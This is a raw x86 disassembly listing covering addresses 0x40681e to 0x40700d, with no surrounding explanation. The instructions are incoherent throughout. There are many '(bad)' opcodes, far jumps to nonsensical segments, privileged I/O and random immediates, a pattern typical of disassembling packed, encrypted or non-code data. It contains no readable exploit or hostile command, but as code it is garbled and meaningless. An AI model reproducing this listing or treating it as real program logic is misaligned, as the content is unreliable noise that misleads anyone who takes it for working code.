  40681e:	lods   eax,DWORD PTR ds:[esi]
  40681f:	jg     0x406827
  406821:	inc    edi
  406822:	jmp    0x52ea:0x24e3ef6b
  406829:	or     DWORD PTR [eax-0x1b],0x13
  40682d:	pushf  
  40682e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40682f:	arpl   dx,di
  406831:	repz sub BYTE PTR [edx-0x593f20e1],bh
  406838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406839:	ins    BYTE PTR es:[edi],dx
  40683a:	int    0x13
  40683c:	jno    0x406814
  40683e:	jbe    0x406862
  406840:	aam    0xa8
  406842:	dec    esi
  406843:	jo     0x40681d
  406845:	ret    
  406846:	arpl   WORD PTR [eax-0xe],bp
  406849:	pop    ebx
  40684a:	sub    al,0xec
  40684c:	jae    0x4067dc
  40684e:	mov    bh,0x25
  406850:	jns    0x406835
  406852:	or     DWORD PTR [ebx-0x3d],esi
  406855:	into   
  406856:	imul   edx,DWORD PTR [ecx-0x4fba7563],0x5bf54e5b
  406860:	adc    eax,0x3b13950d
  406865:	pop    edi
  406866:	aam    0x9d
  406868:	mov    ebp,DWORD PTR [ecx+0x62b7d897]
  40686e:	dec    DWORD PTR [edx-0x6c]
  406871:	ins    DWORD PTR es:[edi],dx
  406872:	push   ds
  406873:	enter  0x5553,0x19
  406877:	aad    0xbc
  406879:	rol    ebx,0xd2
  40687c:	jg     0x4068c8
  40687e:	or     ebx,ebp
  406880:	lods   eax,DWORD PTR ds:[esi]
  406881:	adc    DWORD PTR [esi],eax
  406883:	push   ecx
  406884:	(bad)  
  406885:	mov    WORD PTR [ebp+0x7],?
  406888:	or     al,0x90
  40688a:	add    BYTE PTR [edx-0x50aed2f2],ch
  406890:	cmp    eax,0xa4894e69
  406895:	mov    al,ds:0x42952bc6
  40689a:	ins    BYTE PTR es:[edi],dx
  40689b:	out    0xad,eax
  40689d:	jno    0x4068d1
  40689f:	in     eax,0xb9
  4068a1:	call   0x4f2be3ef
  4068a6:	cmp    eax,0x9deb5922
  4068ab:	mov    ch,0x12
  4068ad:	out    0xd,al
  4068af:	unpckhps xmm1,XMMWORD PTR [edi]
  4068b2:	es loop 0x4068a6
  4068b5:	scas   al,BYTE PTR es:[edi]
  4068b6:	mov    al,ds:0xc7f91c20
  4068bb:	(bad)  
  4068bc:	pop    ss
  4068bd:	pop    esp
  4068be:	shl    DWORD PTR [eax-0x55835568],0x89
  4068c5:	mov    ch,0x2c
  4068c7:	stc    
  4068c8:	fisttp QWORD PTR [edx]
  4068ca:	mov    edi,0xb5c173cf
  4068cf:	in     eax,0x41
  4068d1:	dec    ecx
  4068d2:	xchg   edi,eax
  4068d3:	sub    al,0x5b
  4068d5:	xor    DWORD PTR [ebp+0x62],edx
  4068d8:	aam    0x54
  4068da:	push   0xfffffff9
  4068dc:	scas   al,BYTE PTR es:[edi]
  4068dd:	mov    dh,0xf7
  4068df:	or     ah,ah
  4068e1:	fucomip st,st(1)
  4068e3:	dec    ecx
  4068e4:	int3   
  4068e5:	out    dx,eax
  4068e6:	imul   ebx,DWORD PTR [ebp+0x3b],0x6c3cabef
  4068ed:	mov    esp,0xb54cdd6f
  4068f2:	daa    
  4068f3:	inc    esi
  4068f4:	push   edi
  4068f5:	pop    es
  4068f6:	mov    bh,al
  4068f8:	imul   eax,DWORD PTR [edi+ebx*4],0xce1a7248
  4068ff:	repz push esp
  406901:	js     0x40694b
  406903:	jle    0x406910
  406905:	xor    BYTE PTR [edi],bl
  406907:	stos   DWORD PTR es:[edi],eax
  406908:	push   edi
  406909:	shl    DWORD PTR [edx+0x135bfbc4],1
  40690f:	mov    edx,0x51411612
  406914:	xchg   edi,eax
  406915:	clc    
  406916:	pop    ds
  406917:	cmp    BYTE PTR [edi+ebp*2],dh
  40691a:	pop    ss
  40691b:	or     BYTE PTR [edx+0x4],al
  40691e:	sbb    dl,BYTE PTR [ebx+0x65491e84]
  406924:	fld    TBYTE PTR [edx]
  406926:	xchg   DWORD PTR [ecx-0x136fe110],esp
  40692c:	dec    esi
  40692d:	pop    ebp
  40692e:	pop    esi
  40692f:	not    BYTE PTR [edx+ecx*2]
  406932:	loope  0x406926
  406934:	cmp    eax,0x608cc7c7
  406939:	stos   BYTE PTR es:[edi],al
  40693a:	test   al,0x13
  40693c:	inc    ecx
  40693d:	(bad)
  406940:	mov    DWORD PTR [edi],ebp
  406942:	xchg   ebp,eax
  406943:	pop    edi
  406944:	adc    BYTE PTR [esp],ch
  406947:	lds    edi,FWORD PTR [edx+0x55b287ed]
  40694d:	fs sub eax,0x88105a50
  406953:	popf   
  406954:	push   0xffffffac
  406956:	call   0xc517:0x9eb9e1c1
  40695d:	xor    BYTE PTR [ebx+0x10],dh
  406960:	xchg   edi,eax
  406961:	(bad)
  406964:	dec    edx
  406965:	cwde   
  406966:	lods   eax,DWORD PTR ds:[esi]
  406967:	push   0x197f49d3
  40696c:	out    dx,eax
  40696d:	ret    0xcbbe
  406970:	mov    bl,0x19
  406972:	push   esp
  406973:	leave  
  406974:	imul   esi,DWORD PTR ds:0x67d26b00,0xffffffe0
  40697b:	fucom  st(2)
  40697d:	mov    esp,0x3c8eb7a0
  406982:	retf   0x226c
  406985:	inc    esp
  406986:	iret   
  406987:	das    
  406988:	cli    
  406989:	lock clc 
  40698b:	xor    cl,BYTE PTR [esi]
  40698d:	xlat   BYTE PTR ds:[ebx]
  40698e:	dec    ebp
  40698f:	mov    eax,ds:0xf4e9415a
  406994:	popa   
  406995:	(bad)  
  406996:	je     0x4069ef
  406998:	sub    edi,edi
  40699a:	mov    bh,0x91
  40699c:	pusha  
  40699d:	push   esp
  40699e:	dec    esp
  40699f:	push   cs
  4069a0:	jae    0x40694d
  4069a2:	aas    
  4069a3:	add    BYTE PTR [ebx-0x6a3e6b7b],cl
  4069a9:	out    dx,eax
  4069aa:	dec    ebx
  4069ab:	mov    ds:0xe1ce626c,al
  4069b0:	mov    edx,0x282bcf4a
  4069b5:	gs mov ecx,eax
  4069b8:	mov    al,ds:0x7721f326
  4069bd:	inc    ecx
  4069be:	popf   
  4069bf:	shl    edi,0x3b
  4069c2:	lock add al,0x31
  4069c5:	cmp    BYTE PTR ds:0x714c83f8,bl
  4069cb:	call   0xf170aa5f
  4069d0:	aaa    
  4069d1:	loope  0x40697a
  4069d3:	mov    DWORD PTR [edi-0x3024f07a],ecx
  4069d9:	mov    ebx,0xdf522acd
  4069de:	sbb    eax,0xd8930d9e
  4069e3:	pop    ebp
  4069e4:	stos   DWORD PTR es:[edi],eax
  4069e5:	test   al,0xcb
  4069e7:	dec    eax
  4069e8:	loopne 0x4069e0
  4069ea:	shl    esi,0xba
  4069ed:	out    0x5c,eax
  4069ef:	sahf   
  4069f0:	jae    0x4069be
  4069f2:	outs   dx,DWORD PTR ds:[esi]
  4069f3:	fdivr  DWORD PTR [ebp-0x7c]
  4069f6:	jbe    0x4069d1
  4069f8:	sub    BYTE PTR [edi],dl
  4069fa:	fwait
  4069fb:	out    0x62,eax
  4069fd:	pop    ds
  4069fe:	add    al,0x4d
  406a00:	mov    eax,ds:0x3875b15a
  406a05:	ret    
  406a06:	jl     0x406a67
  406a08:	cdq    
  406a09:	in     eax,dx
  406a0a:	cmp    BYTE PTR [esi],bl
  406a0c:	fidivr DWORD PTR [eax+0x77]
  406a0f:	fdivr  DWORD PTR [edx]
  406a11:	mov    al,ds:0xece0142f
  406a16:	xchg   ebx,eax
  406a17:	leave  
  406a18:	loopne 0x406a7a
  406a1a:	mov    ch,0xc3
  406a1c:	inc    edi
  406a1d:	(bad)  
  406a1e:	mov    ds:0x5e4fa756,eax
  406a23:	mov    bh,0x51
  406a25:	icebp  
  406a26:	and    eax,0xf28dbc43
  406a2b:	adc    al,0x88
  406a2d:	(bad)  
  406a2e:	out    dx,al
  406a2f:	push   ecx
  406a30:	aad    0x63
  406a32:	jnp    0x406a2f
  406a34:	xor    DWORD PTR [edx+0x77],edi
  406a37:	scas   eax,DWORD PTR es:[edi]
  406a38:	in     al,0xc9
  406a3a:	or     ebx,edx
  406a3c:	lock xor al,0xae
  406a3f:	sbb    ebx,DWORD PTR [esi-0x45fdb6d3]
  406a45:	sbb    eax,0x8957b595
  406a4a:	out    0xc3,eax
  406a4c:	fist   DWORD PTR [edx-0x27]
  406a50:	(bad)  
  406a51:	jp     0x4069f3
  406a53:	xchg   edx,eax
  406a54:	retf   0x244
  406a57:	out    dx,al
  406a58:	pop    ecx
  406a59:	mov    DWORD PTR [edx-0x7162c69b],esi
  406a5f:	hlt    
  406a60:	add    ecx,ecx
  406a62:	test   al,0x23
  406a64:	ret    0xc94f
  406a67:	mov    cl,0x79
  406a69:	inc    ecx
  406a6a:	pop    ebx
  406a6b:	and    edi,DWORD PTR [ebp-0x7726ab42]
  406a71:	sub    al,0xc6
  406a73:	pop    ecx
  406a74:	ficomp DWORD PTR [ecx-0x74]
  406a77:	jg     0x406a71
  406a79:	adc    ah,dl
  406a7b:	adc    eax,0xcc8d2171
  406a80:	add    BYTE PTR [esi+ecx*2],ah
  406a83:	loope  0x406a6e
  406a85:	out    dx,eax
  406a86:	ja     0x406a47
  406a88:	ins    DWORD PTR es:[edi],dx
  406a89:	mov    bh,0x99
  406a8b:	cmp    bh,BYTE PTR [edi]
  406a8d:	aad    0x2f
  406a8f:	sbb    DWORD PTR [ecx-0x52175d8f],eax
  406a95:	inc    ebx
  406a96:	test   eax,0x7a1ecaf8
  406a9b:	jmp    0xa2eda52a
  406aa0:	sub    esp,DWORD PTR [edx+0x29734e6b]
  406aa6:	push   cs
  406aa7:	pop    edx
  406aa8:	jg     0x406a84
  406aaa:	fidivr DWORD PTR [ebp-0x46]
  406aad:	in     al,dx
  406aae:	mov    eax,ds:0x59b65aba
  406ab3:	popf   
  406ab4:	mov    ebp,0x6c42a777
  406ab9:	cmp    BYTE PTR [ebp+0x13281d56],cl
  406abf:	ds dec ebp
  406ac1:	call   0xc4209d73
  406ac6:	mov    bh,0x3e
  406ac8:	stos   BYTE PTR es:[edi],al
  406ac9:	mov    al,0xce
  406acb:	outs   dx,DWORD PTR ds:[esi]
  406acc:	push   eax
  406acd:	(bad)  [ebp-0x6d293f5f]
  406ad3:	(bad)  [edi]
  406ad5:	jbe    0x406ad7
  406ad7:	inc    edi
  406ad8:	xchg   esp,eax
  406ad9:	and    eax,ebp
  406adb:	pop    edi
  406adc:	das    
  406add:	push   0xffffffdd
  406adf:	in     eax,dx
  406ae0:	icebp  
  406ae1:	test   BYTE PTR [ecx-0x38],0xdf
  406ae5:	mov    bl,0x1
  406ae7:	and    edi,esp
  406ae9:	aas    
  406aea:	inc    edx
  406aeb:	mov    esp,0x905a255f
  406af0:	sti    
  406af1:	jmp    0x406ab1
  406af3:	aad    0x8f
  406af5:	int    0xff
  406af7:	cwde   
  406af8:	rcr    DWORD PTR [eax+eax*8],cl
  406afb:	jns    0x406a9f
  406afd:	fild   WORD PTR [ebx+0x102304a3]
  406b03:	aas    
  406b04:	xchg   esp,eax
  406b05:	int    0x6
  406b07:	imul   BYTE PTR [edi]
  406b09:	ret    
  406b0a:	sti    
  406b0b:	mov    bh,cl
  406b0d:	xor    DWORD PTR [edx],esp
  406b0f:	cmp    bh,BYTE PTR [ecx+0x18ae7761]
  406b15:	aaa    
  406b16:	xor    BYTE PTR [edx],0x7b
  406b19:	out    dx,al
  406b1a:	cmp    esp,0xffffffdb
  406b1d:	mov    ds:0x53b32bb9,al
  406b22:	pop    eax
  406b23:	inc    ecx
  406b24:	mov    bl,0x4
  406b26:	and    ah,ch
  406b28:	pop    edx
  406b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2a:	mov    ds:0x1435f09e,eax
  406b2f:	mov    ebx,0x4e048b55
  406b34:	xchg   edi,eax
  406b35:	sub    cl,cl
  406b37:	xchg   edx,eax
  406b38:	jl     0x406af1
  406b3a:	sti    
  406b3b:	jle    0x406b04
  406b3d:	push   cs
  406b3e:	ss jecxz 0x406b00
  406b41:	repnz cmp eax,DWORD PTR [esi-0x2f]
  406b45:	les    esi,FWORD PTR ds:0xa91b3852
  406b4b:	jecxz  0x406b65
  406b4d:	add    cl,BYTE PTR [ebx-0x66]
  406b50:	xor    al,0xa6
  406b52:	mov    fs,WORD PTR [edi]
  406b54:	mul    BYTE PTR [edx-0x5d]
  406b57:	jno    0x406bbb
  406b59:	add    ch,al
  406b5b:	loope  0x406b7c
  406b5d:	pop    esi
  406b5e:	leave  
  406b5f:	push   ss
  406b60:	sbb    al,0x31
  406b62:	mov    ecx,0x816cbc3
  406b67:	xchg   ebp,eax
  406b68:	test   al,0xe2
  406b6a:	fwait
  406b6b:	sbb    BYTE PTR [edi-0x640a3b81],cl
  406b71:	popf   
  406b72:	mov    edx,0x856996d6
  406b77:	aad    0xe
  406b79:	push   esp
  406b7a:	xchg   ebx,eax
  406b7b:	sub    al,0x96
  406b7d:	xor    ebx,edx
  406b7f:	push   ds
  406b80:	clc    
  406b81:	xor    al,0xe5
  406b83:	mov    ds:0x5de47493,al
  406b88:	mov    BYTE PTR [eax],cl
  406b8a:	mov    edx,0xd8c7957b
  406b8f:	stos   DWORD PTR es:[edi],eax
  406b90:	mov    esi,fs
  406b92:	sub    dl,BYTE PTR [edx-0x3d]
  406b95:	jnp    0x63d8235
  406b9b:	and    ah,dl
  406b9d:	aad    0x90
  406b9f:	out    dx,eax
  406ba0:	xlat   BYTE PTR ds:[ebx]
  406ba1:	add    BYTE PTR [edi-0x5a],ch
  406ba4:	jp     0x406bd2
  406ba6:	fwait
  406ba7:	push   ecx
  406ba8:	test   BYTE PTR [ebx],ch
  406baa:	inc    esi
  406bab:	call   0x6780:0x4bcf2594
  406bb2:	scas   eax,DWORD PTR es:[edi]
  406bb3:	xchg   ecx,eax
  406bb4:	outs   dx,DWORD PTR ds:[esi]
  406bb5:	pusha  
  406bb6:	cmp    al,0x2f
  406bb8:	inc    ebx
  406bb9:	sbb    edi,DWORD PTR [ecx+eiz*2-0x1f8a7663]
  406bc0:	adc    ebp,edx
  406bc2:	mov    ah,0x9
  406bc4:	or     al,0x7
  406bc6:	js     0x406b75
  406bc8:	(bad)  
  406bc9:	fs push ecx
  406bcb:	sbb    eax,0x586a0bbb
  406bd0:	cmc    
  406bd1:	mov    al,0xdf
  406bd3:	sbb    BYTE PTR [esp+ecx*8+0x1d],bl
  406bd7:	leave  
  406bd8:	mov    al,0xa1
  406bda:	sbb    BYTE PTR [ebx+0x38],0x3
  406bde:	add    ebx,DWORD PTR [esi+eiz*4+0x16fa8889]
  406be5:	sbb    ch,BYTE PTR [edx-0xea49cb1]
  406beb:	fwait
  406bec:	push   edi
  406bed:	(bad)  
  406bef:	mov    ds:0xd0e0ee01,al
  406bf4:	or     ah,cl
  406bf6:	iret   
  406bf7:	sbb    BYTE PTR [ecx-0x10],al
  406bfa:	in     eax,dx
  406bfb:	rcr    BYTE PTR [edi+0x272ea8a8],cl
  406c01:	(bad)  
  406c02:	mov    ds:0xad815383,al
  406c07:	enter  0xb2f,0xa4
  406c0b:	icebp  
  406c0c:	call   0xdd19:0x14800365
  406c13:	repnz adc edx,0xcb0ee31
  406c1a:	pop    edi
  406c1b:	rcl    ah,cl
  406c1d:	imul   ebp,edx,0xcc65ce07
  406c23:	add    eax,0xd5af6c40
  406c28:	push   ds
  406c29:	inc    esi
  406c2a:	mov    edx,0x5e9db2fe
  406c2f:	and    BYTE PTR [eax+eiz*1+0x43d850c9],0xc4
  406c37:	ja     0x406bed
  406c39:	add    ebp,ebp
  406c3b:	inc    edi
  406c3c:	mov    bl,0xf
  406c3e:	out    dx,al
  406c3f:	add    DWORD PTR [ebx-0x258eaf62],eax
  406c45:	add    dl,BYTE PTR [edi+0x68704e05]
  406c4b:	or     eax,0x4cf90a31
  406c50:	dec    esp
  406c51:	std    
  406c52:	jecxz  0x406c8e
  406c54:	mov    DWORD PTR ds:0x31704c4f,ebp
  406c5a:	(bad)  [eax+0x2e]
  406c5d:	and    BYTE PTR [eax+0x7f],ah
  406c60:	sub    DWORD PTR [ebx-0x52],edi
  406c63:	jecxz  0x406c00
  406c65:	mov    al,ds:0x57c439d0
  406c6a:	or     ecx,ebp
  406c6c:	mov    ch,BYTE PTR [eax+0x1b]
  406c6f:	lock jns 0x406c65
  406c72:	dec    eax
  406c73:	mov    cs,WORD PTR [eax+0x96d01e0]
  406c79:	loop   0x406c18
  406c7b:	retf   0x69aa
  406c7e:	push   cs
  406c7f:	fdiv   QWORD PTR [edi+0x1ffb508f]
  406c85:	push   0xcab2697
  406c8a:	jecxz  0x406cb1
  406c8c:	(bad)  
  406c8d:	push   ebx
  406c8e:	jne    0x406ced
  406c90:	sub    esi,eax
  406c92:	dec    esp
  406c93:	push   ecx
  406c94:	mov    al,ds:0xb58de198
  406c99:	and    eax,0x6c069b5
  406c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c9f:	pop    ebx
  406ca0:	add    DWORD PTR [esi+0x7a],ebp
  406ca3:	and    DWORD PTR [edi-0x69],ecx
  406ca6:	pop    eax
  406ca7:	add    DWORD PTR [edi+0x1e3ee714],eax
  406cad:	sub    BYTE PTR [ecx],al
  406caf:	bound  edx,QWORD PTR [edx]
  406cb1:	adc    al,0xa
  406cb3:	shl    BYTE PTR [esi],cl
  406cb5:	xchg   BYTE PTR ds:0x77203308,dh
  406cbb:	test   eax,0x592c433b
  406cc0:	int    0x43
  406cc2:	fwait
  406cc3:	push   0x8558d250
  406cc8:	stos   BYTE PTR es:[edi],al
  406cc9:	jecxz  0x406cd3
  406ccb:	arpl   WORD PTR [edi],cx
  406ccd:	cmp    al,0xec
  406ccf:	int3   
  406cd0:	mov    esi,esi
  406cd2:	test   eax,0xcc231fb7
  406cd7:	aam    0xd8
  406cd9:	mov    cl,0x84
  406cdb:	dec    esp
  406cdc:	jb     0x406ca7
  406cde:	dec    edi
  406cdf:	sub    esi,edi
  406ce1:	bound  eax,QWORD PTR [eax-0x6483a298]
  406ce7:	test   DWORD PTR [ebx],0x55ba5bcb
  406ced:	mov    dl,0x3
  406cef:	(bad)  
  406cf0:	imul   ebp,DWORD PTR [esi+edi*4],0xffffffe2
  406cf4:	push   0x5e
  406cf6:	popf   
  406cf7:	push   cs
  406cf8:	mov    BYTE PTR [ecx],ah
  406cfa:	push   eax
  406cfb:	mov    ah,0xe0
  406cfd:	push   ecx
  406cfe:	pop    esi
  406cff:	inc    DWORD PTR [ecx]
  406d01:	repz jecxz 0x406d0b
  406d04:	add    al,ah
  406d06:	or     bh,BYTE PTR [esi-0x18]
  406d09:	xchg   esp,eax
  406d0a:	pop    ds
  406d0b:	push   0x37
  406d0d:	mov    ds:0xee7a9e6c,al
  406d12:	xor    esi,DWORD PTR [edi+ebx*2+0x780c3a97]
  406d19:	mov    esi,0xd3c07ff1
  406d1e:	ret    0x9bb0
  406d21:	lock lds eax,FWORD PTR [ecx+edi*4-0x78]
  406d26:	dec    ecx
  406d27:	pop    edx
  406d28:	xchg   ebx,eax
  406d29:	or     dl,BYTE PTR [ebx]
  406d2b:	jae    0x406ce3
  406d2d:	scas   eax,DWORD PTR es:[edi]
  406d2e:	enter  0xb783,0x54
  406d32:	mov    ds:0x5d50ed5b,eax
  406d37:	sti    
  406d38:	jnp    0x406d23
  406d3a:	inc    esp
  406d3b:	or     eax,0x220d864f
  406d40:	aad    0x6b
  406d42:	xor    esp,DWORD PTR [edx]
  406d44:	fdiv   DWORD PTR [edx]
  406d46:	push   edi
  406d47:	out    dx,eax
  406d48:	cmc    
  406d49:	in     eax,0xcb
  406d4b:	add    al,0x72
  406d4d:	mov    ds:0xdd08d451,eax
  406d52:	scas   eax,DWORD PTR es:[edi]
  406d53:	icebp  
  406d54:	adc    al,0x12
  406d56:	inc    edi
  406d57:	or     al,0x41
  406d59:	adc    ah,BYTE PTR [ebx-0x1596749b]
  406d5f:	enter  0xaee1,0x5c
  406d63:	mov    DWORD PTR [ebx-0x4d],eax
  406d66:	cwde   
  406d67:	sub    edi,DWORD PTR [eax+eax*2]
  406d6a:	mov    al,ds:0x27f0fd3e
  406d6f:	mov    eax,ds:0x2dd8d875
  406d74:	fs jne 0x406d78
  406d77:	and    BYTE PTR [esi-0x31],al
  406d7a:	in     eax,dx
  406d7b:	jmp    0x76af:0xbcb89a68
  406d82:	retf   
  406d83:	repz mov al,0xee
  406d86:	adc    edx,DWORD PTR ds:0x54c7acda
  406d8c:	pop    es
  406d8d:	and    al,0x2f
  406d8f:	xchg   ah,dh
  406d91:	jne    0x406deb
  406d93:	fld    st(2)
  406d95:	cli    
  406d96:	dec    edx
  406d97:	jns    0x406d78
  406d99:	jmp    0x1412e256
  406d9e:	rcl    DWORD PTR [esi],0xe3
  406da1:	mov    edi,0xd5e7f4c8
  406da6:	mov    ch,0x4f
  406da8:	sti    
  406da9:	xor    ch,BYTE PTR [ebx+0x71623bd7]
  406daf:	cld    
  406db0:	pusha  
  406db1:	xor    eax,0xaa6a1359
  406db6:	fistp  QWORD PTR [ebx+0x6d1f3e8e]
  406dbc:	add    ecx,edx
  406dbe:	adc    BYTE PTR [eax-0x38fc9ec3],dl
  406dc4:	(bad)  
  406dc5:	sub    BYTE PTR [ecx+0x6ffdac25],cl
  406dcb:	jmp    DWORD PTR [ebp+0x39]
  406dce:	mov    esp,0x45748d01
  406dd3:	std    
  406dd4:	mov    ds:0x6c1caca0,eax
  406dd9:	fwait
  406dda:	push   ecx
  406ddb:	sbb    eax,0x7b178fe8
  406de0:	lea    esi,[edi]
  406de2:	ficomp WORD PTR [edx]
  406de4:	xor    edi,ebx
  406de6:	sti    
  406de7:	push   esi
  406de8:	or     al,0x45
  406dea:	cmc    
  406deb:	push   ebp
  406dec:	shr    BYTE PTR [ecx-0x4deed38a],0x3
  406df3:	mov    ds:0xe54cbff9,ax
  406df9:	push   cs
  406dfa:	push   ds
  406dfb:	jmp    0x2a3a:0xee50e2df
  406e02:	dec    ecx
  406e03:	out    dx,eax
  406e04:	xor    dh,bh
  406e06:	(bad)  
  406e07:	int    0xb0
  406e09:	sbb    al,0x7c
  406e0b:	mov    cl,0x82
  406e0d:	ffree  st(4)
  406e0f:	jbe    0x406e10
  406e11:	mov    BYTE PTR [edi+edx*1+0x160f0ca5],bl
  406e18:	enter  0xe9ba,0x29
  406e1c:	jle    0x406e19
  406e1e:	test   BYTE PTR [edx+0x6ba696ec],0xcb
  406e25:	aad    0x3b
  406e27:	dec    esp
  406e28:	add    edx,DWORD PTR [ebp+0xa]
  406e2b:	cmp    esp,DWORD PTR [edi+0x46]
  406e2e:	daa    
  406e2f:	mov    edi,DWORD PTR [ecx+0x7a]
  406e32:	add    eax,0x3282e62c
  406e37:	pop    esi
  406e38:	dec    edi
  406e39:	cmpxchg BYTE PTR [edi+0x28720a45],dh
  406e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e41:	dec    edx
  406e42:	push   ecx
  406e43:	enter  0x7077,0x4a
  406e47:	es test eax,0x8af00d1
  406e4d:	sbb    DWORD PTR [ecx-0x593af33e],ecx
  406e53:	arpl   WORD PTR [edi+ebx*2+0x5f],cx
  406e57:	jnp    0x406e9d
  406e59:	push   eax
  406e5a:	push   edx
  406e5b:	and    esi,ebp
  406e5d:	loope  0x406e37
  406e5f:	shr    ecx,1
  406e61:	sub    DWORD PTR [ecx],ebp
  406e63:	add    al,0xf7
  406e65:	mov    esp,0x5ad19aa
  406e6a:	push   edi
  406e6b:	sahf   
  406e6c:	push   ds
  406e6d:	adc    esi,ebp
  406e6f:	adc    DWORD PTR [edx],ebp
  406e71:	xor    esi,0x6c
  406e74:	xchg   esi,eax
  406e75:	cld    
  406e76:	mov    ds:0x6e02ef34,al
  406e7b:	sbb    eax,0xb4b352ef
  406e80:	or     edi,DWORD PTR [edi+eiz*2-0x48]
  406e84:	cmp    BYTE PTR [edx-0xb766db2],dl
  406e8a:	das    
  406e8b:	je     0x406e9b
  406e8d:	inc    esi
  406e8e:	cli    
  406e8f:	popf   
  406e90:	mov    ah,0xd8
  406e92:	and    al,0xc6
  406e94:	or     al,0x6c
  406e96:	jno    0x406f12
  406e98:	test   DWORD PTR [esp+ebx*8-0x59c419fc],ebp
  406e9f:	mov    eax,0x8577e065
  406ea4:	xchg   ebp,eax
  406ea5:	add    BYTE PTR [edi],bl
  406ea7:	and    dh,al
  406ea9:	mov    esp,0x380f6888
  406eae:	or     esp,DWORD PTR [ebx-0x20]
  406eb1:	mov    al,BYTE PTR [edi+0x1a]
  406eb4:	jne    0x406f10
  406eb6:	mov    dl,0xca
  406eb8:	mov    dl,0xe2
  406eba:	outs   dx,BYTE PTR ds:[esi]
  406ebb:	push   ebp
  406ebc:	push   esp
  406ebd:	or     BYTE PTR [ebx-0x23d31acc],bh
  406ec3:	mov    ecx,0x19603cea
  406ec8:	arpl   ax,cx
  406eca:	enter  0x69bb,0xd
  406ece:	fsubrp st(1),st
  406ed0:	imul   edi,DWORD PTR [eax],0xffffffec
  406ed3:	dec    eax
  406ed4:	paddd  mm1,QWORD PTR [esi-0x65c7b559]
  406edb:	or     al,0xb
  406edd:	pop    ecx
  406ede:	leave  
  406edf:	push   ds
  406ee0:	xchg   esp,eax
  406ee1:	loope  0x406f59
  406ee3:	mov    ebx,0x1898f46c
  406ee8:	aam    0xce
  406eea:	adc    dl,BYTE PTR [ecx+eax*1+0x653fdd1f]
  406ef1:	cmp    ecx,DWORD PTR [ebx+0x7aba76a8]
  406ef7:	imul   eax,DWORD PTR [ecx],0x6a046a64
  406efd:	push   edi
  406efe:	xchg   edi,eax
  406eff:	mov    al,ds:0x43f5895d
  406f04:	std    
  406f05:	dec    ebx
  406f06:	mov    dl,0x74
  406f08:	xor    eax,0x51a8a6fb
  406f0d:	push   ebp
  406f0e:	add    ebx,DWORD PTR [ebx+eiz*1+0x5f666a37]
  406f15:	fadd   QWORD PTR [edx-0x5b]
  406f18:	nop
  406f19:	addr16 or eax,0xfbce14f4
  406f1f:	or     esp,DWORD PTR [ebx]
  406f21:	adc    BYTE PTR ds:0x8297d38f,bh
  406f27:	jge    0x406f09
  406f29:	jmp    0x82f:0x61d8f988
  406f30:	lea    ecx,[edx+ecx*1-0x3f8b11e6]
  406f37:	dec    ebx
  406f38:	outs   dx,DWORD PTR ds:[esi]
  406f39:	pop    ebx
  406f3a:	lea    esi,[ebp+0x7c2ab1da]
  406f40:	cmc    
  406f41:	(bad)  
  406f42:	mov    eax,0xfd98bbdb
  406f47:	out    0x5f,eax
  406f49:	icebp  
  406f4a:	xchg   DWORD PTR [ecx],edi
  406f4c:	push   ss
  406f4d:	pop    ebx
  406f4e:	mov    BYTE PTR [edi+0x7f],al
  406f51:	jns    0x406eee
  406f53:	add    bl,BYTE PTR [edi+ebx*1]
  406f56:	mov    ah,0xe6
  406f58:	or     dl,al
  406f5a:	sub    bh,0xd4
  406f5d:	add    BYTE PTR [ebx+ebp*4-0x3c],0x49
  406f62:	push   esp
  406f63:	push   cs
  406f64:	pop    ecx
  406f65:	jns    0x406f84
  406f67:	sub    bh,BYTE PTR [edx+0x2a8813c7]
  406f6d:	fdiv   QWORD PTR [esi]
  406f6f:	or     esi,edx
  406f71:	pop    edx
  406f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f73:	mov    ch,al
  406f75:	test   edx,0x188de6a1
  406f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f7c:	jno    0x406f7b
  406f7e:	mov    dh,0x78
  406f80:	add    al,0xec
  406f82:	add    eax,0x108fa4cb
  406f87:	fwait
  406f88:	push   esp
  406f89:	add    eax,0x8bc90302
  406f8e:	lock (bad) 
  406f90:	mov    eax,ds:0x5dd467b1
  406f95:	loope  0x406f96
  406f97:	test   al,0x17
  406f99:	or     BYTE PTR [ecx],0xa6
  406f9c:	and    ch,dh
  406f9e:	xchg   dl,cl
  406fa0:	dec    ecx
  406fa1:	cmp    BYTE PTR [eax+0x2d75abbd],bh
  406fa7:	jae    0x406f7d
  406fa9:	xor    edx,DWORD PTR [edx]
  406fab:	(bad)  
  406fac:	ror    DWORD PTR [ecx-0x37],1
  406faf:	adc    BYTE PTR [esp+edi*8-0x3],cl
  406fb3:	adc    bl,BYTE PTR [edx-0x65178f9]
  406fb9:	scas   al,BYTE PTR es:[edi]
  406fba:	dec    edi
  406fbb:	adc    BYTE PTR ss:[ebp+0x6c],cl
  406fbf:	or     al,0xfe
  406fc1:	(bad)  
  406fc2:	pop    esi
  406fc3:	or     eax,0xe2dd7b86
  406fc8:	cmp    al,0x4e
  406fca:	int    0xdd
  406fcc:	jb     0x407003
  406fce:	jmp    0x406f8a
  406fd0:	inc    ebx
  406fd1:	in     al,0xd6
  406fd3:	jg     0x40703d
  406fd5:	hlt    
  406fd6:	adc    dh,BYTE PTR ds:[ecx+0x319b0df5]
  406fdd:	in     eax,0xe6
  406fdf:	mov    eax,ebx
  406fe1:	fdivrp st(6),st
  406fe3:	ret    0x2ded
  406fe6:	mov    ss,ebp
  406fe8:	cmp    al,0x54
  406fea:	scas   eax,DWORD PTR es:[edi]
  406feb:	jmp    0x667a:0xc7e1fef0
  406ff2:	and    al,0xac
  406ff4:	stos   DWORD PTR es:[edi],eax
  406ff5:	lock mov edi,DWORD PTR [ebx+ecx*8]
  406ff9:	xor    DWORD PTR [ebx-0xc],esi
  406ffc:	cmp    al,0xc7
  406ffe:	sub    BYTE PTR [ebp-0x36],bh
  407001:	mov    cl,0xe1
  407003:	pop    eax
  407004:	(bad)  
  407005:	or     al,0x90
  407007:	cmc    
  407008:	pop    ds
  407009:	push   ebx
  40700a:	adc    ah,ah
  40700c:	push   edi
  40700d:	mov    WORD PTR [eax+eiz*4-0x1db6673d],ss
